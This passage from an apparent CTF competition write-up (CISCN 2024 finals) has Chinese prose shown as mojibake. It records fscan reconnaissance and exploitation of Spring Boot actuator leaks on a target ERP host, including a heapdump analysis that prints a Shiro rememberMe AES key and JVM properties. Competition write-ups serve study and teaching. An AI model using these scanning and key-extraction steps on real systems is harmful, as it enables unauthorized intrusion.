punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">this</span><span class="token punctuation">.</span>check <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> targetc<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="Fobeeï¼ˆUnsolvedï¼‰"><a href="#Fobeeï¼ˆUnsolvedï¼‰" class="headerlink" title="Fobeeï¼ˆUnsolvedï¼‰"></a>Fobeeï¼ˆUnsolvedï¼‰</h2><p>æ²¡çœ‹</p><hr><h1 id="Pwn-PHPï¼ˆUnsolvedï¼‰"><a href="#Pwn-PHPï¼ˆUnsolvedï¼‰" class="headerlink" title="Pwn-PHPï¼ˆUnsolvedï¼‰"></a>Pwn-PHPï¼ˆUnsolvedï¼‰</h1><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721224758509.png" alt="image-20240721224758509"></p><p>CVE-2024-2961ï¼Ÿ</p><p>fixè²Œä¼¼æŠŠiconvçš„soæ–‡ä»¶æ‰¬äº†å°±è¡Œ</p><hr><h1 id="æ¸—é€"><a href="#æ¸—é€" class="headerlink" title="æ¸—é€"></a>æ¸—é€</h1><p>æˆ‘ä¸ä¼šæ¸—é€ä¹Ÿæ²¡æ‰“è¿‡äº‘å¢ƒï¼Œå†…ç½‘ä»£ç†è¿˜æ˜¯å‰ä¸€å¤©ç°å­¦çš„ï¼Œä½†æ˜¯æ ¹æœ¬æ²¡å»ºç«‹èµ·ä¸€ä¸ªå†…ç½‘ä»£ç†çš„æ€è·¯ï¼Œä»£ç†è¿˜æ˜¯ç­‰å·¨é­”ä»é…’åº—æ‹¿æ‹“å±•åå›æ¥æ‰å¼€å¼ çš„ï¼ˆ</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721140100586.png" alt="image-20240721140100586"></p><p>ä¼ fscanåˆ°vpsæ‰«ä¸€ä¸‹</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@vps:~<span class="token comment"># ./fscan -h 192.168.36.88/24</span>   ___                              _      / _ <span class="token punctuation">\</span>     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __  / /_<span class="token punctuation">\</span>/____/ __<span class="token operator">|</span>/ __<span class="token operator">|</span> '__/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ // /_<span class="token punctuation">\</span><span class="token punctuation">\</span>_____<span class="token punctuation">\</span>__ <span class="token punctuation">\</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span>    <span class="token punctuation">\</span>____/     <span class="token operator">|</span>___/<span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>_<span class="token punctuation">\</span>                        fscan version: <span class="token number">1.8</span>.3start infoscan<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">192.168</span>.36.88   is alive<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target <span class="token number">192.168</span>.36.253  is alive<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Icmp alive hosts len is: <span class="token number">2</span><span class="token number">192.168</span>.36.88:22 <span class="token function">open</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> alive ports len is: <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åæ‰«erp</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span>fscan.exe <span class="token parameter variable">-h</span> <span class="token number">8.130</span>.44.201   ___                              _  / _ <span class="token punctuation">\</span>     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __ / /_<span class="token punctuation">\</span>/____/ __<span class="token operator">|</span>/ __<span class="token operator">|</span> '__/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ // /_<span class="token punctuation">\</span><span class="token punctuation">\</span>_____<span class="token punctuation">\</span>__ <span class="token punctuation">\</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span><span class="token punctuation">\</span>____/     <span class="token operator">|</span>___/<span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>_<span class="token punctuation">\</span>                     fscan version: <span class="token number">1.8</span>.3start infoscan<span class="token number">8.130</span>.44.201:8080 <span class="token function">open</span><span class="token number">8.130</span>.44.201:22 <span class="token function">open</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> alive ports len is: <span class="token number">2</span>start vulscan<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://8.130.44.201:8080  code:302 len:0      title:None è·³è½¬url: http://8.130.44.201:8080/login<span class="token punctuation">;</span><span class="token assign-left variable">jsessionid</span><span class="token operator">=</span>65B247F806C408534985A1D9591BE5BE<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://8.130.44.201:8080/login<span class="token punctuation">;</span><span class="token assign-left variable">jsessionid</span><span class="token operator">=</span>65B247F806C408534985A1D9591BE5BE code:200 len:1383   title:Master ERP login Form<span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://8.130.44.201:8080 poc-yaml-spring-actuator-heapdump-file<span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://8.130.44.201:8080 poc-yaml-springboot-env-unauth spring2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ERP"><a href="#ERP" class="headerlink" title="ERP"></a>ERP</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://8.130.44.201:8080  code:302 len:0      title:None è·³è½¬url: http://8.130.44.201:8080/login<span class="token punctuation">;</span><span class="token assign-left variable">jsessionid</span><span class="token operator">=</span>65B247F806C408534985A1D9591BE5BE<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://8.130.44.201:8080/login<span class="token punctuation">;</span><span class="token assign-left variable">jsessionid</span><span class="token operator">=</span>65B247F806C408534985A1D9591BE5BE code:200 len:1383   title:Master ERP login Form<span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://8.130.44.201:8080 poc-yaml-spring-actuator-heapdump-file<span class="token punctuation">[</span>+<span class="token punctuation">]</span> PocScan http://8.130.44.201:8080 poc-yaml-springboot-env-unauth spring2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>å­˜åœ¨æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œè®¿é—®<code>/actuator/env</code>å¯ä»¥è¯»åˆ°é…ç½®ä¿¡æ¯</p><p><code>/actuator/heapdump</code>å¯ä»¥å¯¼å‡ºå †å†…å­˜ä¿¡æ¯</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">java</span> <span class="token parameter variable">-jar</span> JDumpSpider-1.1-SNAPSHOT-full.jar heapdumpLoading heap dump heapdump from cache failed.java.io.IOException: HPROF <span class="token function">time</span> mismatch. Cached <span class="token number">1698502789924</span> from heap dump <span class="token number">1721521747178</span>        at org.graalvm.visualvm.lib.jfluid.heap.HprofHeap.<span class="token operator">&lt;</span>init<span class="token operator">></span><span class="token punctuation">(</span>HprofHeap.java:385<span class="token punctuation">)</span>        at org.graalvm.visualvm.lib.jfluid.heap.HeapFactory.loadHeap<span class="token punctuation">(</span>HeapFactory.java:96<span class="token punctuation">)</span>        at org.graalvm.visualvm.lib.jfluid.heap.HeapFactory.createHeap<span class="token punctuation">(</span>HeapFactory.java:79<span class="token punctuation">)</span>        at org.graalvm.visualvm.lib.jfluid.heap.HeapFactory.createHeap<span class="token punctuation">(</span>HeapFactory.java:55<span class="token punctuation">)</span>        at org.graalvm.visualvm.lib.jfluid.heap.GraalvmHeapHolder.<span class="token operator">&lt;</span>init<span class="token operator">></span><span class="token punctuation">(</span>GraalvmHeapHolder.java:18<span class="token punctuation">)</span>        at cn.wanghw.Main.call<span class="token punctuation">(</span>Main.java:66<span class="token punctuation">)</span>        at cn.wanghw.Main.main<span class="token punctuation">(</span>Main.java:29<span class="token punctuation">)</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>SpringDataSourceProperties-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>WeblogicDataSourceConnectionPoolConfig-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>MongoClient-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>AliDruidDataSourceWrapper-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>HikariDataSource-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>RedisStandaloneConfiguration-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>JedisClient-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>CookieRememberMeManager<span class="token punctuation">(</span>ShiroKey<span class="token punctuation">)</span>-------------algMode <span class="token operator">=</span> GCM, key <span class="token operator">=</span> 0f+dthGML0M572/nBElv8g<span class="token operator">==</span>, algName <span class="token operator">=</span> AES<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>OriginTrackedMapPropertySource-------------management.endpoints.web.exposure.include <span class="token operator">=</span> *spring.thymeleaf.encoding <span class="token operator">=</span> UTF-8management.endpoint.health.show-details <span class="token operator">=</span> alwaysspring.thymeleaf.cache <span class="token operator">=</span> <span class="token boolean">true</span>spring.thymeleaf.content-type <span class="token operator">=</span> text/htmlserver.port <span class="token operator">=</span> <span class="token number">8080</span>spring.thymeleaf.check-template <span class="token operator">=</span> <span class="token boolean">true</span>management.endpoints.jmx.exposure.include <span class="token operator">=</span> *<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>MutablePropertySources-------------awt.toolkit <span class="token operator">=</span> sun.awt.X11.XToolkitsun.boot.class.path <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classesjava.protocol.handler.pkgs <span class="token operator">=</span> org.springframework.boot.loadersun.management.compiler <span class="token operator">=</span> HotSpot <span class="token number">64</span>-Bit Tiered Compilerssun.cpu.isalist <span class="token operator">=</span>sun.jnu.encoding <span class="token operator">=</span> UTF-8java.runtime.version <span class="token operator">=</span> <span class="token number">1.8</span>.0_412-8u412-ga-1~20.04.1-b08java.class.path <span class="token operator">=</span> /opt/erp/ERPProject-0.0.1-SNAPSHOT.jarpath.separator <span class="token operator">=</span> <span class="token builtin class-name">:</span>java.vm.vendor <span class="token operator">=</span> Private Buildos.version <span class="token operator">=</span> <span class="token number">5.4</span>.0-187-genericjava.endorsed.dirs <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsedjava.runtime.name <span class="token operator">=</span> OpenJDK Runtime Environmentfile.encoding <span class="token operator">=</span> UTF-8catalina.useNaming <span class="token operator">=</span> <span class="token boolean">false</span>spring.beaninfo.ignore <span class="token operator">=</span> <span class="token boolean">true</span>java.vm.specification.version <span class="token operator">=</span> <span class="token number">1.8</span>os.name <span class="token operator">=</span> Linuxjava.vm.name <span class="token operator">=</span> OpenJDK <span class="token number">64</span>-Bit Server VMlocal.server.port <span class="token operator">=</span> nulluser.country <span class="token operator">=</span> USjava.vendor.url.bug <span class="token operator">=</span> http://bugreport.sun.com/bugreport/sun.java.command <span class="token operator">=</span> /opt/erp/ERPProject-0.0.1-SNAPSHOT.jarjava.io.tmpdir <span class="token operator">=</span> /tmpcatalina.home <span class="token operator">=</span> /tmp/tomcat.8080.4070673021461777528java.version <span class="token operator">=</span> <span class="token number">1.8</span>.0_412user.home <span class="token operator">=</span> /rootuser.language <span class="token operator">=</span> enPID <span class="token operator">=</span> <span class="token number">589</span>java.awt.printerjob <span class="token operator">=</span> sun.print.PSPrinterJobCONSOLE_LOG_CHARSET <span class="token operator">=</span> UTF-8file.separator <span class="token operator">=</span> /catalina.base <span class="token operator">=</span> /tmp/tomcat.8080.4070673021461777528java.vm.info <span class="token operator">=</span> mixed modejava.specification.name <span class="token operator">=</span> Java Platform API Specificationjava.vm.specification.vendor <span class="token operator">=</span> Oracle CorporationFILE_LOG_CHARSET <span class="token operator">=</span> UTF-8java.awt.graphicsenv <span class="token operator">=</span> sun.awt.X11GraphicsEnvironmentjava.awt.headless <span class="token operator">=</span> <span class="token boolean">true</span>sun.io.unicode.encoding <span class="token operator">=</span> UnicodeLittlejava.ext.dirs <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>MapPropertySources-------------local.server.port <span class="token operator">=</span> null<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>ConsulPropertySources-------------not found<span class="token operator">!</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>JavaProperties-------------java.util.logging.FileHandler.pattern <span class="token operator">=</span> %h/java%u.logawt.toolkit <span class="token operator">=</span> sun.awt.X11.XToolkitsun.cpu.isalist <span class="token operator">=</span>sun.jnu.encoding <span class="token operator">=</span> UTF-8java.class.path <span class="token operator">=</span> /opt/erp/ERPProject-0.0.1-SNAPSHOT.jarjdk.security.legacyAlgorithms <span class="token operator">=</span> SHA1, RSA keySize <span class="token operator">&lt;</span> <span class="token number">2048</span>, DSA keySize <span class="token operator">&lt;</span> <span class="token number">2048</span>java.vm.vendor <span class="token operator">=</span> Private Buildjdk.disabled.namedCurves <span class="token operator">=</span> secp112r1, secp112r2, secp128r1, secp128r2, secp160k1, secp160r1, secp160r2, secp192k1, secp192r1, secp224k1, secp224r1, secp256k1, sect113r1, sect113r2, sect131r1, sect131r2, sect163k1, sect163r1, sect163r2, sect193r1, sect193r2, sect233k1, sect233r1, sect239k1, sect283k1, sect283r1, sect409k1, sect409r1, sect571k1, sect571r1, X9.62 c2tnb191v1, X9.62 c2tnb191v2, X9.62 c2tnb191v3, X9.62 c2tnb239v1, X9.62 c2tnb239v2, X9.62 c2tnb239v3, X9.62 c2tnb359v1, X9.62 c2tnb431r1, X9.62 prime192v2, X9.62 prime192v3, X9.62 prime239v1, X9.62 prime239v2, X9.62 prime239v3, brainpoolP256r1, brainpoolP320r1, brainpoolP384r1, brainpoolP512r1crypto.policy <span class="token operator">=</span> unlimitedjceks.key.serialFilter <span class="token operator">=</span> java.lang.Enum<span class="token punctuation">;</span>java.security.KeyRep<span class="token punctuation">;</span>java.security.KeyRep<span class="token variable">$Type</span><span class="token punctuation">;</span>javax.crypto.spec.SecretKeySpec<span class="token punctuation">;</span><span class="token operator">!</span>*sun.arch.data.model <span class="token operator">=</span> <span class="token number">64</span>login.configuration.provider <span class="token operator">=</span> sun.security.provider.ConfigFilecatalina.useNaming <span class="token operator">=</span> <span class="token boolean">false</span>user.timezone <span class="token operator">=</span>security.overridePropertiesFile <span class="token operator">=</span> <span class="token boolean">true</span>java.vm.specification.version <span class="token operator">=</span> <span class="token number">1.8</span>os.name <span class="token operator">=</span> Linuxuser.country <span class="token operator">=</span> USsecurity.provider.7 <span class="token operator">=</span> com.sun.security.sasl.Providersun.boot.library.path <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/amd64sun.java.command <span class="token operator">=</span> /opt/erp/ERPProject-0.0.1-SNAPSHOT.jarsecurity.provider.9 <span class="token operator">=</span> sun.security.smartcardio.SunPCSCjdk.security.caDistrustPolicies <span class="token operator">=</span> SYMANTEC_TLSsun.cpu.endian <span class="token operator">=</span> littleuser.home <span class="token operator">=</span> /rootuser.language <span class="token operator">=</span> enjava.specification.vendor <span class="token operator">=</span> Oracle Corporationen <span class="token operator">=</span> UTF-8security.provider.1 <span class="token operator">=</span> sun.security.provider.Sunsecurity.provider.2 <span class="token operator">=</span> sun.security.rsa.SunRsaSignsecurity.provider.3 <span class="token operator">=</span> sun.security.ec.SunECnetworkaddress.cache.negative.ttl <span class="token operator">=</span> <span class="token number">10</span>jdk.tls.alpnCharset <span class="token operator">=</span> ISO_8859_1security.provider.4 <span class="token operator">=</span> com.sun.net.ssl.internal.ssl.Providersecurity.provider.5 <span class="token operator">=</span> com.sun.crypto.provider.SunJCEsecurity.provider.6 <span class="token operator">=</span> sun.security.jgss.SunProviderssl.KeyManagerFactory.algorithm <span class="token operator">=</span> SunX509file.separator <span class="token operator">=</span> /java.specification.name <span class="token operator">=</span> Java Platform API Specificationjava.vm.specification.vendor <span class="token operator">=</span> Oracle CorporationFILE_LOG_CHARSET <span class="token operator">=</span> UTF-8.level <span class="token operator">=</span> INFOjava.awt.graphicsenv <span class="token operator">=</span> sun.awt.X11GraphicsEnvironmentja <span class="token operator">=</span> UTF-8java.awt.headless <span class="token operator">=</span> <span class="token boolean">true</span>com.xyz.foo.level <span class="token operator">=</span> SEVEREpackage.definition <span class="token operator">=</span> sun.,com.sun.xml.internal.,com.sun.imageio.,com.sun.istack.internal.,com.sun.jmx.,com.sun.media.sound.,com.sun.naming.internal.,com.sun.proxy.,com.sun.corba.se.,com.sun.org.apache.bcel.internal.,com.sun.org.apache.regexp.internal.,com.sun.org.apache.xerces.internal.,com.sun.org.apache.xpath.internal.,com.sun.org.apache.xalan.internal.extensions.,com.sun.org.apache.xalan.internal.lib.,com.sun.org.apache.xalan.internal.res.,com.sun.org.apache.xalan.internal.templates.,com.sun.org.apache.xalan.internal.utils.,com.sun.org.apache.xalan.internal.xslt.,com.sun.org.apache.xalan.internal.xsltc.cmdline.,com.sun.org.apache.xalan.internal.xsltc.compiler.,com.sun.org.apache.xalan.internal.xsltc.trax.,com.sun.org.apache.xalan.internal.xsltc.util.,com.sun.org.apache.xml.internal.res.,com.sun.org.apache.xml.internal.resolver.helpers.,com.sun.org.apache.xml.internal.resolver.readers.,com.sun.org.apache.xml.internal.security.,com.sun.org.apache.xml.internal.serializer.utils.,com.sun.org.apache.xml.internal.utils.,com.sun.org.glassfish.,com.oracle.xmlns.internal.,com.oracle.webservices.internal.,oracle.jrockit.jfr.,org.jcp.xml.dsig.internal.,jdk.internal.,jdk.nashorn.internal.,jdk.nashorn.tools.,jdk.xml.internal.,com.sun.activation.registries.,jdk.jfr.events.,jdk.jfr.internal.,jdk.management.jfr.internal.sun.boot.class.path <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classesjava.protocol.handler.pkgs <span class="token operator">=</span> org.springframework.boot.loadersun.management.compiler <span class="token operator">=</span> HotSpot <span class="token number">64</span>-Bit Tiered Compilersjava.runtime.version <span class="token operator">=</span> <span class="token number">1.8</span>.0_412-8u412-ga-1~20.04.1-b08policy.provider <span class="token operator">=</span> sun.security.provider.PolicyFileuser.name <span class="token operator">=</span> rootpolicy.url.1 <span class="token operator">=</span> file:<span class="token variable">$&#123;java.home&#125;</span>/lib/security/java.policypath.separator <span class="token operator">=</span> <span class="token builtin class-name">:</span>fr <span class="token operator">=</span> UTF-8securerandom.source <span class="token operator">=</span> file:/dev/randompolicy.url.2 <span class="token operator">=</span> file:<span class="token variable">$&#123;user.home&#125;</span>/.java.policyjdk.tls.disabledAlgorithms <span class="token operator">=</span> SSLv3, TLSv1, TLSv1.1, RC4, DES, MD5withRSA, DH keySize <span class="token operator">&lt;</span> <span class="token number">1024</span>, EC keySize <span class="token operator">&lt;</span> <span class="token number">224</span>, 3DES_EDE_CBC, anon, NULL, include jdk.disabled.namedCurvesos.version <span class="token operator">=</span> <span class="token number">5.4</span>.0-187-genericjava.endorsed.dirs <span class="token operator">=</span> /usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsedpolicy.ignoreIdentityScope <span class="token operator">=</span> <span class="token boolean">false</span>java.runtime.name <span class="token operator">=</span> OpenJDK Runtime Environmentkeystore.type.compat <span class="token operator">=</span> <span class="token boolean">true</span>file.encoding <span class="token operator">=</span> UTF-8spring.beaninfo.ignore <span class="token operator">=</span> <span class="token boolean">true</span>java.util.logging.ConsoleHandler.formatter <span class="token operator">=</span> java.util.logging.SimpleFormatterjava.vm.name <span class="token operator">=</span> OpenJDK <span class="token number">64</span>-Bit Server VMjdk.sasl.disabledMechanisms <span class="token operator">=</span>java.vendor.url.bug <span class="token operator">=</span> http://bugreport.sun.com/bugreport/java.io.tmpdir <span class="token operator">=</span> /tmpjava.util.logging.FileHandler.formatter <span class="token operator">=</span> java.util.logging.XMLFormatterjava.util.logging.FileHandler.count <span class="token operator">=</span> <span class="token number">1</span>catalina.home <span class="token operator">=</span> /tmp/tomcat.8080.4070673021461777528sun.cds.enableSharedLookupCache <span class="token operator">=</span> <span class="token boolean">false</span>java.version <span class="token operator">=</span> <span class="token number">1.8</span>.0_412sun.security.krb5.maxReferrals <span class="token operator">=</span> <span class="token number">5</span>jdk.tls.keyLimits <span class="token operator">=</span> AES/GCM/NoPadding KeyUpdate <span class="token number">2</span>^37java.vm.specification.name <span class="token operator">=</span> Java Virtual Machine SpecificationPID <span class="token operator">=</span> <span class="token number">589</span>java.awt.printerjob <span class="token operator">=</span> sun.print.PSPrinterJobCONSOLE_LOG_CHARSET <span class="token operator">=</span> UTF-8jdk.xml.dsig.secureValidationPolicy <span class="token operator">=</span> disallowAlg http://www.w3.org/TR/1999/REC-xslt-19991116,disallowAlg http://www.w3.org/2001/04/xmldsig-more<span class="token comment">#rsa-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#hmac-md5,disallowAlg http://www.w3.org/2001/04/xmldsig-more#md5,maxTransforms 5,maxReferences 30,disallowReferenceUriSchemes file http https,minKeySize RSA 1024,minKeySize DSA 1024,minKeySize EC 224,noDuplicateIds,noRetrievalMethodLoops</span>catalina.base <span class="token operator">=</span> /tmp/tomcat.8080.4070673021461777528java.library.path <span class="token operator">=</span> 